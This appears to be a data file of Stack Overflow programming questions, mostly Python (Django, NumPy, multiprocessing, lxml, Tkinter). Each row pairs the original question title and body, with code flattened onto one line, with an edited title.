Django Make Content Type Not Required," I have this model: and whenever I do something like this: of course I will receive the error: For my purposes, I can't avoid contenttypes because Auth is a class where a Broker and Agent class inherits from, which allows me to do multiple custom profiles.I was wondering if there was a way in which the content type would not be required.Thanks in advance! <code>  class Auth(models.Model): TYPES = ( ('agent', 'Agent'), ('broker', 'Broker'), ) user = models.ForeignKey(User, unique=True) type = models.CharField(max_length=20, choices=TYPES) applied = models.BooleanField() content_type = models.ForeignKey(ContentType) object_id = models.PositiveIntegerField(db_index=True) content_object=generic.GenericForeignKey('content_type', 'object_id') User.objects.create_user(username=""myuser"", password=""myuser"", email=""myemail.com"")u = User.objects.get(username=""myuser"")profile = Auth(user=u)profile.save() IntegrityError: (1048, ""Column 'content_type_id' cannot be null"")",Django Make ContentType Not Required
Remove <script> tags with BeautifulSoup (Python)," Can <script> tags and all of their contents be removed from HTML with BeautifulSoup, or do I have to use Regular Expressions or something else? <code> ",Can I remove script tags with BeautifulSoup?
How do I use prepared statements in SQlite in Python / Django?, How do I use prepared statement for inserting MULTIPLE records in SQlite using Python / Django? <code> ,How do I use prepared statements for inserting MULTIPLE records in SQlite using Python / Django?
How do I use prepared statements for inserting records in SQlite using Python / Django?, How do I use prepared statement for inserting MULTIPLE records in SQlite using Python / Django? <code> ,How do I use prepared statements for inserting MULTIPLE records in SQlite using Python / Django?
Using R from within Python," I would like to access R from within a Python program. I am aware of Rpy2, pyrserve and PypeR.What are the advantages or disadvantages of these three options? <code> ","How do Rpy2, pyrserve and PypeR compare?"
Python 2.7: How to check if a deque is empty?, Is try-catch the only method to do that? <code> ,How to check if a deque is empty
How to check if a deque is empty in Python?, Is try-catch the only method to do that? <code> ,How to check if a deque is empty
How to check if a deque is empty?, Is try-catch the only method to do that? <code> ,How to check if a deque is empty
IndexError: list assignment index out of range," Please consider the following code: The output (Python 2.6.6 on Win 7 32-bit) is: I guess it's something simple I don't understand. Can someone clear it up? <code>  i = [1, 2, 3, 5, 8, 13]j = []k = 0for l in i: j[k] = l k += 1print j > Traceback (most recent call last): > j[k] = l IndexError: list assignment index out of range",Why does this iterative list-growing code give IndexError: list assignment index out of range?
python mysql insert data," I want to insert the integers 188 and 90 in my MySQL database, but the following code doesn't work: Why doesn't it work? <code>  import MySQLdbconn = MySQLdb.connect(host= ""localhost"", user=""root"", passwd=""newpassword"", db=""engy1"")x = conn.cursor()x.execute(""SELECT * FROM anooog1"")x.execute ("" INSERT INTO anooog1 VALUES ('%s','%s') "", (188,90))row = x.fetchall()",How can I insert data into a MySQL database?
Django create custom UserCreationForm (basic)," I enabled the user auth module in Django, however when I use UserCreationForm it only asks for username and the two password/password confirmation fields. I also want email and fullname fields, all set as required fields.I've done this: Now the form shows the new fields but it doesn't save them to the database.How can I fix this? <code>  from django.contrib.auth.forms import UserCreationFormfrom django import formsfrom django.contrib.auth.models import Userclass RegisterForm(UserCreationForm): email = forms.EmailField(label = ""Email"") fullname = forms.CharField(label = ""Full name"") class Meta: model = User fields = (""username"", ""fullname"", ""email"", )",Django create custom UserCreationForm
Why to use __setatrr__ in python ?," I don't know for why using __setattr__ instead simple referencing like x.a=1. I understand this example: but don't get why using code depending on string ('height').Could you explain me what are advantages of __setattr__ ? <code>  class Rectangle: def __init__(self): self.width = 0 self.height = 0x=Rectangle()x.width=20x.__setattr__('height',30)setattr(x,'width',99)",Why to use __setattr__ in python ?
Python: How to store a variable," unfortunately raw_input is not doing what I need it to do. What I am trying to do is get totPrimes = whatever I type in at the prompt. If i replace while count < totPrimes with while count < 50 this script works. If I type 50 into the prompt, this script doesnt work, I'm afraid raw_input isn't the function im looking to use? Here is a snippet of my code: <code>  testNum = 3div = 2count = 1totPrimes = raw_input(""Please enter the primes: "")while count < totPrimes : while div <= testNum :",Python: Problem with raw_input reading a number
Using 100% of all cores with Python (multiprocessing)," I have two pieces of code that I'm using to learn about multiprocessing in Python 3.1. My goal is to use 100% of all the available processors.However, the code snippets here only reach 30% - 50% on all processors.Is there anyway to 'force' python to use all 100%?Is the OS (windows 7, 64bit) limiting Python's access to the processors?While the code snippets below are running, I open the task manager and watch the processor's spike, but never reach and maintain 100%.In addition to that, I can see multiple python.exe processes created and destroyed along the way. How do these processes relate to processors? For example, if I spawn 4 processes, each process isn't using it's own core. Instead, what are the processes using? Are they sharing all cores? And if so, is it the OS that is forcing the processes to share the cores?code snippet 1 code snippet 2 <code>  import multiprocessingdef worker(): #worker function print ('Worker') x = 0 while x < 1000: print(x) x += 1 returnif __name__ == '__main__': jobs = [] for i in range(50): p = multiprocessing.Process(target=worker) jobs.append(p) p.start() from multiprocessing import Process, Lockdef f(l, i): l.acquire() print('worker ', i) x = 0 while x < 1000: print(x) x += 1 l.release()if __name__ == '__main__': lock = Lock() for num in range(50): Process(target=f, args=(lock, num)).start()",Using 100% of all cores with the multiprocessing module
Best way to merge two dictionaries in Python," Hi I'm pretty new to Python, so I'm not really aware of all the little tricks and shortcuts yet. I have two multi-dimensional arrays: and Basically, I want to merge these into an array of dictionary objects. Something like: Is there some kewl Pythonic way of doing this really easily using Lamba expressions or some niftiness? Thanks! <code>  >>> colorStrings[('0', '2371_9890_020'), ('1', '2371_9031_100'), ('2', '2371_9890_464')] >>> skus[('0', '0017651670'), ('0', '0017651688'), ('0', '0017651696'), ('0', '0017651704'), ('0', '0017651712'), ('0', '0017651720'), ('0', '0017651738'), ('1', '0017650896'), ('1', '0017650904'), ('1', '0017650912'), ('1', '0017650920'), ('1', '0017650938'), ('1', '0017650946'), ('1', '0017650953'), ('2', '0017651746'), ('2', '0017651753'), ('2', '0017651761'), ('2', '0017651779'), ('2', '0017651787'), ('2', '0017651795'), ('2', '0017651803')] [{ 'colorString': '2371_9890_020' 'skus': ('0017651670', '0017651688', '0017651696', '0017651704', '0017651712', '0017651720, '0017651738')},{ 'colorString': '2371_9031_100' 'skus': ('0017650896', '0017650904', '0017650912', '0017650920', '0017650938', '0017650946, '0017650953')},{ 'colorString': '2371_9890_464' 'skus': ('0017651746', '0017651753', '0017651761', '0017651779', '0017651787', '0017651795, '0017651803')}]",Pythonic way to merge two List of tuples into single list of dict
Passing Data into Python Unittest: Redirected STDIN vs Pickle," Short QuestionWhat is the best way to get data into a Python unittest case ?BackgroundMy project is using Python's unittest module as an automated way execute a series of tests that will need to run on many of the same type of boards. So far this is a good fit to what the unittest module was designed for; the twist is that each test case needs to know run specific information to store in a Django database.The data that needs to be passed in includes a serial number, who tested the board, the date, and other things of this nature. It is worth noting that the order in which the boards will be tested is chosen by a human that pulls board X from a box, so predicting the serial number is not possible.ThoughtsCurrently, I am passing the required data to and from the test cases via pickle. This method works fine in small testing, but my concern is reading and writing to the same file 100k + times gives lots of room for data corruption (+ it's not that fast). I wrote an answer to a SO Question that redirects the stdin in a way that I think might work well for this application as well.The next step is going to be wrap a GUI around these tests. A personal goal would be to have the ability to run the tests via command line then have the GUI call the same command line functions. For this reason I am leaning towards moving to the redirected stdin.System / Deployment InformationRequired OS Support: Windows XP and Windows 7Ideal OS Support: Mac OS X and LinuxPython Version: 2.7 Any thoughts or comments would be greatly appreciated. <code> ",Which is the better way to pass data into Python Unittest Redirected STDIN or Pickle ?
Shift all indices in NumPy Array," I have a numpy array like this: and want to create an array where the value in index 0 is in index 1, index 1 is in index 2, etc.The output I want is: I'm guessing there's an easy way to do this without iterating through the full array. How can I do this in a numPythonic way? <code>  x=np.array([0,1,2,3,4]) y=np.array([0,0,1,2,3]).",Shift all indices in NumPy array
replace spaces with dash and remove prefix from string," I'm using this to remove spaces and special characters and convert characters to lowercase: I want to:replace spaces with -if the string starts with the word the, then itSo that, for instance, The beatles music! would become beatles-music. <code>  ''.join(e for e in artistName if e.isalnum()).lower()",Replace spaces with dash and remove prefix from string
Get headers from Numpy Array in python," With below, I can get the row and col data from SQL:How would I get the table headers as part of the result set or array.? Just like I asked here:How do I create a CSV file from database in Python? <code>  top = csr.execute(""Select * from bigtop"") d=list(top) a = np.asarray(d, dtype='object') print a",Get SQL headers from Numpy Array in python
Difference between clusure in python and javascript," In JS, we can write closure like: However, if I write following code in python Then I get UnboundedLocalError.Can anyone tell me the difference between closure in python and JS? <code>  function f(){var a=0;function g(){ alert(a++);}return g;}g=f()g() def f(): a=0 def g(): a+=1 print a return gg=f()g()",Difference between closures in python and javascript
python's webbrowser launches IE instead of default on windows 7," I'm attempting to launch a local html file from python in the default browser (right now my default is Google Chrome if I double-click on a .html file, Chrome launches.)When I use python's webbrowser.open(), IE launches instead, with a blank address bar. I've checked my default programs and they look correct. I'm on Win 7 SP1. Why is Chrome not launching?Update: The code will be running on unknown OS's and machines, so hardcoding or registering browsers or path updates are not options. I'm thinking that parsing the url for file:// and then doing an os.path.exists check and os.path.realpath might be the answer. <code>  Python 2.7.1 (r271:86832, Nov 27 2010, 17:19:03) [MSC v.1500 64 bit (AMD64)] on win32Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.>>> import webbrowser>>> filename = 'test.html'>>> webbrowser.open('file://'+filename)True>>> print(webbrowser.get().__class__.__name__)WindowsDefault","python's webbrowser launches IE, instead of default browser, on Windows relative path"
"python's webbrowser launches IE, instead of default browser on Windows"," I'm attempting to launch a local html file from python in the default browser (right now my default is Google Chrome if I double-click on a .html file, Chrome launches.)When I use python's webbrowser.open(), IE launches instead, with a blank address bar. I've checked my default programs and they look correct. I'm on Win 7 SP1. Why is Chrome not launching?Update: The code will be running on unknown OS's and machines, so hardcoding or registering browsers or path updates are not options. I'm thinking that parsing the url for file:// and then doing an os.path.exists check and os.path.realpath might be the answer. <code>  Python 2.7.1 (r271:86832, Nov 27 2010, 17:19:03) [MSC v.1500 64 bit (AMD64)] on win32Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.>>> import webbrowser>>> filename = 'test.html'>>> webbrowser.open('file://'+filename)True>>> print(webbrowser.get().__class__.__name__)WindowsDefault","python's webbrowser launches IE, instead of default browser, on Windows relative path"
Python: Get character position in alphabet," I'm 90% sure there is a built in function that does this.I need to find the position of a character in an alphabet. So the character ""b"" is position 1 (counting from 0), etc. Does anyone know what the function is called?Thanks in advance!EDIT: What i'm trying to do is to send all the characters X amount of ""steps"" back in the alpha bet, so if i have a string with ""hi"" it would be ""gh"" if i sent it back one step. There might be a better way of doing it, any tips? <code> ",Get character position in alphabet
Why is pytz.UTC adding 6 hours to my timestamp," I'm working with a code that gives me utc timestamps and I want to convert them to appropriate datetimes. Unfortunately when I test simple cases with pytz the datetime has an added 6 hours (the CST offset to UTC). I need to keep timezone data correct because I am calculating difference between other timezones as well. Any ideas why and how to convert a utc timestamp to a utc datetime? <code>  In [1]: import pytzIn [2]: from datetime import datetimeIn [3]: import timeIn [4]: datetime.fromtimestamp(time.mktime(datetime(7,1,1, tzinfo=pytz.UTC).timetuple()), tz=pytz.UTC)Out[4]: datetime.datetime(2007, 1, 1, 6, 0, tzinfo=<UTC>)In [5]: datetime.fromtimestamp(time.mktime(datetime(7,1,1).utctimetuple()), tz=pytz.UTC)Out[5]: datetime.datetime(2007, 1, 1, 6, 0, tzinfo=<UTC>)In [6]: datetime.fromtimestamp(time.mktime(datetime(7,1,1).utctimetuple()))Out[6]: datetime.datetime(2007, 1, 1, 0, 0)",Converting python datetime to timestamp and back in UTC still uses local timezone
running python from browser," I am basically a PHP guy. now moving towards python. I am starting to learn python. How do I install it and start working it, and develop websites . I got totally confused with the alternative implementations in the download section of the Python site. Can you tell me what ""alternative implementations"" means?. I mean to say: I can create a .php file in my server and then access it from browser like http://example.com/index.php, so I was wondering whether I can do the same with python, like creating a .py file and accessing from browser http://example.com/index.py. <code> ",Start creating websites by using Python
Memory allocated to Python in the OS is never released back in Linux even after gc.collect() / No issues in Windows," I have written code within Python that doesn't release memory the way it should. The memory is taken by Python but never gets released even after not being used anymore. Even if you break the running program with ctrl+c. Delete the variable and run gc.collect() it doesn't seem to collect. Or the same as in Ipython and running %reset. The memory won't be freed and running gc.collect() has no effect. I tested this in Windows because I wanted to see if it could possibly be with the garbage collector library. It appears that is the case. Run the code below in Linux and then also in windows. Then compare the memory usage. You will need numpy and scipy installed. Any help or insight on this issue would be much appreciated.Import the Model, create an instance, and then run createSpecific().Here is a code that exhibits this behavior in Ubuntu 10.04: <code>  from numpy import array, maximum,intersect1d, meshgrid, std, log, log10, zeros, ones, argwhere, abs, arange, size, copy, sqrt, sin, cos, pi, vstack, hstack, zeros, exp, max, mean, savetxt, loadtxt, minimum, linspace, wherefrom numpy.fft import fftfrom scipy.stats import f_oneway, kruskal, sem, scoreatpercentile#import matplotlib#matplotlib.use('cairo.pdf')from matplotlib.pyplot import plot, clf, show, cla, xlim, xscale, imshow, ylabel, xlabel, figure, savefig, close, bar, title, xticks, yticks, axes, axisfrom matplotlib.axes import Axesfrom mpl_toolkits.mplot3d import Axes3D#from enthought.mayavi import mlabfrom matplotlib import cmimport matplotlib.pyplot as pltimport osfrom time import clockfrom timeit import Timerclass Model:#Constructors and default includes def __init__(self, prevAud = None, debug=False): if (prevAud == None): self.fs=16000. #sample rate self.lowFreq=60. self.hiFreq=5000. self.numFilt=300 #number of channel self.EarQ = 9.26449 #9.26449 self.minBW = 24.7 #24.7 self.integrationWindow=.01 self.sliceAt=.035 self.maxOverallInhibit = 0.1 self.winLen = int(self.fs*self.integrationWindow+.01) #default integration window 10 ms self.fullWind = 0.300 self.outShortWindow = None self.siderArray = None self.maxNormalizeValue = .284 # Optimized at .284 self.outputSemiModel = None self.semitones = 11 self.activationTrace = None return def setErbScale(self, erbScale = None): if (erbScale ==None): self.erbScale = arange(100,500,5) else: self.erbScale = erbScale def trainModel(self,soundVec=None, fs=None, lowfreq=None, highfreq=None, numfilt=None, figto=0, savefig = 'N', prompts=False, plotter=False): self.setErbScale() templateArray = self.intWindow(self.halfWaveRec(self.creGammatone(soundVec))) for i in xrange(templateArray[0].size): self.outerTest(self.innerTest(templateArray[:,i])) return templateArray def createSpecific(self, freqArray = None, semitones = 11, timeforHarm = .3, soundVec=None, fs=None, lowfreq=None, highfreq=None, numfilt=None, figto=0, saveData='N', fileDir='TempRunT/', prompts=False, plotter=False): if (freqArray == None): self.setErbScale() freqArray = self.erbScale if (type(semitones) == int): semitones = arange(semitones+1) totalRuns = int(timeforHarm/self.integrationWindow+.001) inhibitWindowArray = zeros((freqArray.size,(semitones.size),self.numFilt,totalRuns)) for x in xrange(freqArray.size): tempHarm = self.makeHarmonicAmpMod(freqArray[x],timeforHarm, numHarm=7,modulation=10) for y in semitones: tempChord = self.makeSemiChordAmpMod(tempHarm, freqArray[x],timeforHarm,modulation=10,numHarm=7,semi=y) inhibitWindowArray[x,y] = self.trainModel( tempChord, savefig = 'N', plotter=plotter) self.inhibitWindowArray = inhibitWindowArray def creGammatone(self, soundVec): temp = zeros((300,soundVec.size)) for i in xrange(temp[:,0].size): temp[i] = -1**i*soundVec return temp def halfWaveRec(self, halfWaveFilts): filtShape = halfWaveFilts.shape if (filtShape[1] != int(self.fs*self.fullWind)): halfWaveFilts = hstack((halfWaveFilts,zeros((self.numFilt,int(self.fs*self.fullWind)-filtShape[1])))) temp = zeros((halfWaveFilts[:,0].size,halfWaveFilts[0].size)) halfWaveFilts = maximum(halfWaveFilts,temp) del temp return halfWaveFilts def intWindow(self, integratedFilts): winlen = self.winLen length = integratedFilts[0].size/winlen mod = integratedFilts[0].size%winlen outShortWindow = zeros((integratedFilts[:,0].size,length)) meanval = 0 if (mod != 0): for i in xrange(integratedFilts[:,0].size): mean(integratedFilts[i,0:-mod].reshape(length,winlen),1,out=outShortWindow[i]) else: for i in xrange(integratedFilts[:,0].size): mean(integratedFilts[i].reshape(length,winlen),1,out=outShortWindow[i]) del integratedFilts return outShortWindow def innerTest(self, window): temper = copy(window) sider = 7 st = .04 sizer = temper.size inhibVal = 0 for j in xrange(sider): inhibVal = (temper[0:j+sider+1].sum())*(sider*2+1)/(sider+1+j) window[j] += - st*(inhibVal) for j in xrange(sider,sizer - sider): inhibVal = temper[j-sider:j+sider+1].sum() window[j] += - st*(inhibVal) for j in xrange(sizer-sider, sizer): inhibVal = (temper[j-sider:sizer].sum())*(sider*2+1)/(sider+sizer-j) window[j] += - st*(inhibVal) maxsub = max(window) * self.maxOverallInhibit window += - maxsub del temper return window def outerTest(self, window): newSatValue = scoreatpercentile(window, (76)) numones = where(window > newSatValue) window[numones]=1 self.maxSatValue = newSatValue del numones return window def makeHarmonicAmpMod(self, freq = 100, time = 1.,modulation=10, fsamp=None, numHarm=7): if fsamp == None: fsamp = self.fs samples = arange(time*fsamp) signal = 0 for x in xrange(1,(numHarm+1),1): signal = signal + sin(samples/float(fsamp)*x*freq*2*pi) signal = (signal)*maximum(zeros(time*fsamp),sin((samples/float(fsamp)*modulation*2*pi))) return signal def makeSemiChordAmpMod(self, harmVec = None, freq=100, time = 1., modulation=10, fsamp=None, numHarm=7, semi = 2): if (harmVec == None): harmVec = self.makeHarmonicAmpMod(freq,time,modulation,fsamp,numHarm) if (semi == 0): return harmVec return harmVec + self.makeHarmonicAmpMod(freq*(2**(semi/12.)),time,modulation,fsamp,numHarm)",Memory allocated to Python is not released back in Linux even after gc.collect()
add field fist_name and last_name in django-profile," I need add the first_name and last_name fields associated with that User model and display it in the profile form.fields: My model is something like this : when rendering the profile form, would have to show the fields. EditI resolved to:#forms.py #urls.py and add in #signals.py  <code>  >>> user = User.objects.get(pk=1) >>> user.first_name u'Some' >>> user.last_name u'User' class UserProfile(models.Model): user = models.ForeignKey(User, unique=True) personal_email = models.EmailField(blank=True) address = models.CharField(max_length=140) phone_number = models.CharField(max_length=20) def __unicode__(self): return u'Profile of user: %s' % self.user.username first_name: last_name: personal_email: address: phone_number: class UserProfileForm(forms.ModelForm): first_name = forms.CharField(max_length=30) last_name = forms.CharField(max_length=30) def __init__(self, *args, **kwargs): super(UserProfileForm, self).__init__(*args, **kwargs) self.fields['first_name'].initial = self.instance.user.first_name self.fields['last_name'].initial = self.instance.user.last_name self.fields.keyOrder = [ 'first_name', 'last_name', 'personal_email', 'address', 'phone_number', ] def save(self, *args, **kwargs): super(UserProfileForm, self).save(*args, **kwargs) self.instance.user.first_name = self.cleaned_data.get('first_name') self.instance.user.last_name = self.cleaned_data.get('last_name') self.instance.user.save() class Meta: model = UserProfile url(r'^profiles/edit/', edit_profile, {'form_class': UserProfileForm}, name='profiles_edit_profile' ), @receiver(post_save, sender=User) def create_profile(sender, instance, created, **kwargs): if created: userprofile, new = UserProfile.objects.get_or_create(user=instance)",add field first_name and last_name in django-profile
Is there a nice way to sort a list using a list of indices?," Here's a example of what I want to do I can do it with enumerate, list and so on, but I would like to directly affect spam_list, like list.sort() and not copy it like sorted()Edit : pushed a string example to avoid confusion between indices and values of spam_listEdit : turned out this is a duplicate of Python sort parallel arrays in place?. Well, I can't delete so much efforts for SO consistency arguments. <code>  spam_list = [""We"", ""are"", ""the"", ""knights"", ""who"", ""say"", ""Ni""]spam_order = [0,1,2,4,5,6,3]spam_list.magical_sort(spam_order)print(spam_list)[""We"", ""are"", ""the"", ""who"", ""say"", ""Ni"", ""knights""]",In-place way to apply a permutation to a list? (inverse of sorting-by-key)
Nice way to inverse-sort (permute) a list using a list of indices in-place?," Here's a example of what I want to do I can do it with enumerate, list and so on, but I would like to directly affect spam_list, like list.sort() and not copy it like sorted()Edit : pushed a string example to avoid confusion between indices and values of spam_listEdit : turned out this is a duplicate of Python sort parallel arrays in place?. Well, I can't delete so much efforts for SO consistency arguments. <code>  spam_list = [""We"", ""are"", ""the"", ""knights"", ""who"", ""say"", ""Ni""]spam_order = [0,1,2,4,5,6,3]spam_list.magical_sort(spam_order)print(spam_list)[""We"", ""are"", ""the"", ""who"", ""say"", ""Ni"", ""knights""]",In-place way to apply a permutation to a list? (inverse of sorting-by-key)
Get Tkinter Label Text?," Im making a list of addresses that the user will select from, and the address text will be returned. I need to use Tkinter.Label because the Tkinter.Listbox will not allow for newlines.The kicker is there is no .get()-like method in the Label class... I know I can do something like: However, I have a list of 5-20 address' keeping a seperate array of StringVar()'s will be difficult b/c I have no way of identifying the loc of the active label. I would like to just access the activated widget contents.Is Tkinter.Label the right widget to be using? <code>  v = StringVar()Label(master, textvariable=v).pack()v.set(""New Text!"") ...print v.get()",How to get the Tkinter Label text?
Initialising an array of fixed size in python," I would like to know how i can initialize an array(or list), yet to be populated with values, to have a defined size.For example in C: How do I do that in Python? <code>  int x[5]; /* declared without adding elements*/",Initialising an array of fixed size in Python
Is Scala Functional Programming Language?," I've learned programming from Java, then tried to learn one programming language per year, second was C++, then Python. It came to learn next one, I looked for something new, I choose Scala because it was compatible with Java and could be some transition from OOP to Functional Programming. It was cool, learning new paradigms, new style and new way of thinking. It was great experience just read about elegant Scala concepts, and much better to code on Scala. Reading a lot of articles I faced this article criticizing Scala: Scala is not a functional programming language. It is a statically typed object oriented language with closures.After reading this articles some doubts came to me, I really like Scala and was starting to write on Scala more, but is Scala suits definition of Functional Programming? Is that article says truth or just faking readers? Must I learn Haskell or some other Functional Programming Language to really experience FP?UPDATE: Expecting rational answers with good examples, without causing disputes. <code> ",Is Scala a Functional Programming Language?
Find the Friday of previous/last week, Eg1. Suppose I have a day 4/30/07 .Then I need to get 4/27/07. Eg2. Suppose I have a day 6/29/07 .Then I need to get 6/22/07. <code> ,Find the Friday of previous/last week in python
Ordered Sets Python 2.7.1," I have a list that I'm attempting to remove duplicate items from. I'm using python 2.7.1 so I can simply use the set() function. However, this reorders my list. Which for my particular case is unacceptable. Below is a function I wrote; which does this. However I'm wondering if there's a better/faster way. Also any comments on it would be appreciated. The above function assumes that none of the items will be None, and that the items are in order (ie, ['a', 'a', 'a', 'b', 'b', 'c', 'd'])The above function returns ['a', 'a', 'a', 'b', 'b', 'c', 'd'] as ['a', 'b', 'c', 'd']. <code>  def ordered_set(list_): newlist = [] lastitem = None for item in list_: if item != lastitem: newlist.append(item) lastitem = item return newlist",Ordered Sets Python 2.7
Spliting strings by capltal letters regex python," I am trying to split strings into lists of ""tags"" in python. The splitting should handle strings such as ""HappyBirthday"" and remove most punctuation but preserve hyphens, and apostrophes. My starting point is: I would want to turn this sample data: Into: P.S. I am sorry my description isn't very good. I am not sure how to explain it, and have been mostly unsuccessful with google. I hope the example illustrates it properly.Edit: i think i needed to be more precise, so also,if the word is hypenated and capital, like 'UN-American' will it keep it as one word so output would be 'UN-American'if the hyphen has a space on either or both sides, a la 'THIS- is' or 'This - is' it should ignore the hypen and produce [""THIS"", ""is""] and [""This"", ""is""] respecticly, and simmilarly for an apostrophe if its in the middle of a word like ""What'sItCalled"" it should produce [""What's"",""It"", ""Called""]  <code>  tags = re.findall(""([A-Z]{2,}(?=[A-Z]|$)|[A-Z][a-z]*)|\w+-\w+|[\w']+"" Jeff's dog is un-American SomeTimes! BUT NOTAlways ['Jeff's', 'dog', 'is', 'un-American', 'Some', 'Times', 'BUT', 'NOT', 'Always']",Word tokenization using python regular expressions
python empty class object," I'm teaching a Python class on object-oriented programming and as I'm brushing up on how to explain classes, I saw an empty class definition: The example then goes on to define a name and other attributes for an object of this class: Interesting!I'm wondering if there's a way to dynamically define a function for an instance of a class like this? something like: This doesn't work in my Python interpreter, but is there another way of doing it? <code>  class Employee: pass john = Employee()john.full_name = ""john doe"" john.greet() = print 'Hello, World!'",Empty class object in Python
Is it a good practice to automatically add names to __all__?," Is this a good practice in Python (from Active State Recipes -- Public Decorator)? The general idea would be to define a decorator that takes a function or classand adds its name to the __all__ of the current module. <code>  import sysdef public(f): """"""Use a decorator to avoid retyping function/class names. * Based on an idea by Duncan Booth: http://groups.google.com/group/comp.lang.python/msg/11cbb03e09611b8a * Improved via a suggestion by Dave Angel: http://groups.google.com/group/comp.lang.python/msg/3d400fb22d8a42e1 """""" all = sys.modules[f.__module__].__dict__.setdefault('__all__', []) if f.__name__ not in all: # Prevent duplicates if run from an IDE. all.append(f.__name__) return fpublic(public) # Emulate decorating ourself",Is it a good practice to add names to __all__ using a decorator?
XPath predicate with sub-paths?," I'm trying to understand and XPath that was sent to me for use with ACORD XML forms (common format in insurance). The XPath they sent me is (truncated for brevity): Where I'm running into trouble is that Python's lxml library is telling me that [InsuredOrPrincipalInfo/InsuredOrPrincipalRoleCd=""AN""] is an invalid predicate. I'm not able to find anywhere in the XPath spec on predicates which identifies this syntax so that I can modify this predicate to work.Is there any documentation on what exactly this predicate is selecting? Also, is this even a valid predicate, or has something been mangled somewhere?Possibly related:I believe the company I am working with is an MS shop, so this XPath may be valid in C# or some other language in that stack? I'm not entirely sure.Updates:Per comment demand, here is some additional info.XML sample: Code sample (with full XPath instead of snippet): <code>  ./PersApplicationInfo/InsuredOrPrincipal[InsuredOrPrincipalInfo/InsuredOrPrincipalRoleCd=""AN""]/GeneralPartyInfo <ACORD> <InsuranceSvcRq> <HomePolicyQuoteInqRq> <PersPolicy> <PersApplicationInfo> <InsuredOrPrincipal> <InsuredOrPrincipalInfo> <InsuredOrPrincipalRoleCd>AN</InsuredOrPrincipalRoleCd> </InsuredOrPrincipalInfo> <GeneralPartyInfo> <Addr> <Addr1></Addr1> </Addr> </GeneralPartyInfo> </InsuredOrPrincipal> </PersApplicationInfo> </PersPolicy> </HomePolicyQuoteInqRq> </InsuranceSvcRq></ACORD> >>> from lxml import etree>>> tree = etree.fromstring(raw)>>> tree.find('./InsuranceSvcRq/HomePolicyQuoteInqRq/PersPolicy/PersApplicationInfo/InsuredOrPrincipal[InsuredOrPrincipalInfo/InsuredOrPrincipalRoleCd=""AN""]/GeneralPartyInfo/Addr/Addr1')Traceback (most recent call last): File ""<console>"", line 1, in <module> File ""lxml.etree.pyx"", line 1409, in lxml.etree._Element.find (src/lxml/lxml.etree.c:39972) File ""/Library/Python/2.5/site-packages/lxml-2.3-py2.5-macosx-10.3-i386.egg/lxml/_elementpath.py"", line 271, in find it = iterfind(elem, path, namespaces) File ""/Library/Python/2.5/site-packages/lxml-2.3-py2.5-macosx-10.3-i386.egg/lxml/_elementpath.py"", line 261, in iterfind selector = _build_path_iterator(path, namespaces) File ""/Library/Python/2.5/site-packages/lxml-2.3-py2.5-macosx-10.3-i386.egg/lxml/_elementpath.py"", line 245, in _build_path_iterator selector.append(ops[token[0]](_next, token)) File ""/Library/Python/2.5/site-packages/lxml-2.3-py2.5-macosx-10.3-i386.egg/lxml/_elementpath.py"", line 207, in prepare_predicate raise SyntaxError(""invalid predicate"")SyntaxError: invalid predicate",XPath predicate with sub-paths with lxml?
how can i make ipdb show more lines of context while debugging?," By default, during debugging in IPython, ipdb shows one line above and one line below the current position in code. Is there an easy way to make the area shown a bit bigger? I'd think it would be configurable, but haven't been able to find it. <code> ",How can I make ipdb show more lines of context while debugging?
Is it possible to use Mysql with SqlAlchemy and Flask if my mysql socket isn't in tmp?," The location for mysql.sock on my system is /usr/local/mysql5/mysqld.sock When I try to use mysql via sqlalchemy from flask, I get: The mysql program connects correctly to the database, as does every other mysql client on my system.My my.cnf has the correct location for the socket The base ""SQLAlchemy"" library has an option where you can specify the location of the mysql.sock, but this isn't exposed through the sqlalchemy / flask libraryhttp://packages.python.org/Flask-SQLAlchemy/config.htmlMy questions:Where does sqlalchemy get the idea that /tmp/mysql.sock is the correct location?Is there a way to change the default via the Flash-SQLAlchemy connector <code>  thrilllap-2:tmp reuven$ mysqld --print-defaultsmysqld would have been started with the following arguments:--socket=/usr/local/mysql5/mysqld.sock --port=3306 File ""build/bdist.macosx-10.6-intel/egg/MySQLdb/connections.py"", line 187, in __init__sqlalchemy.exc.OperationalError: (OperationalError) (2002, ""Can't connect to local MySQL server through socket '/tmp/mysql.sock' (2)"") None None [client]port = 3306socket = /usr/local/mysql5/mysqld.sock [safe_mysqld]socket = /usr/local/mysql5/mysqld.sock [mysqld_safe]socket = /usr/local/mysql5/mysqld.sock [mysqld]socket = /usr/local/mysql5/mysqld.sock port = 3306",Is it possible to use Mysql with SqlAlchemy and Flask if my mysql socket isn't in /tmp?
Create a numpy matrix with elements a function of indices," How can I create a numpy matrix with its elements being a function of its indices?For example, a multiplication table: a[i,j] = i*jAn Un-numpy and un-pythonic would be to create an array of zeros and then loop through.There is no doubt that there is a better way to do this, without a loop.However, even better would be to create the matrix straight-away. <code> ",Create a numpy matrix with elements as a function of indices
Python: Cut of the last word of a sentence?," What's the best way to slice the last word from a block of text? I can think of Split it to a list (by spaces) and removing the last item, then reconcatenating the list.Use a regular expression to replace the last word.I'm currently taking approach #1, but I don't know how to concatenate the list... Any code examples are much appreciated. <code>  content = content[position-1:position+249] # Contentwords = string.split(content, ' ')words = words[len[words] -1] # Cut of the last word",Python: Cut off the last word of a sentence?
How well does your language's support unicode in practice?," I'm looking into new languages, kind of craving for one where I no longer need to worry about charset problems amongst inordinate amounts of other niggles I have with PHP for a new project.I tend to find Java too verbose and messy, and my not wanting to touch Windows with a 6-foot pole tends to rule out .Net. That leaves essentially everything else -- except PHP, C and C++ (the latter two of which I know get messy with unicode stuff irrespective of the ICU library).I've short listed a few languages to date, namely Ruby (loved the mixins), Python, Lisp and Javascript (node.js). However, I'm coming with highly inconsistent information on unicode support and I'm dreading (lack of time...) to learn each and every one of them to the point where I can safely break it to rule it out.In so far as I understood, Python 3 seems to have it. As does Ruby 1.9. Lisp not necessarily. Javascript presumably.There's arguably more than unicode support to a language, but in my experience it tends to become a major drawback when dealing with locale.I also realize the question is somewhat subjective. (Please don't close it on that grounds: I'm actually linking to several SO threads which I found unsatisfying.) But... as a user of any of these languages, how well do they support unicode in practice? <code> ",How well does your language support unicode in practice?
"Python, Printing multiple times,"," How can I repeat a string multiple times, multiple times? I know I can use a for loop, but I would like to repeat a string x times per row, over n rows.For example, if the user enters 2, the output would be: Where x equals 2, and n equals 4. <code>  @@@@@@@@",How to print a string multiple times?
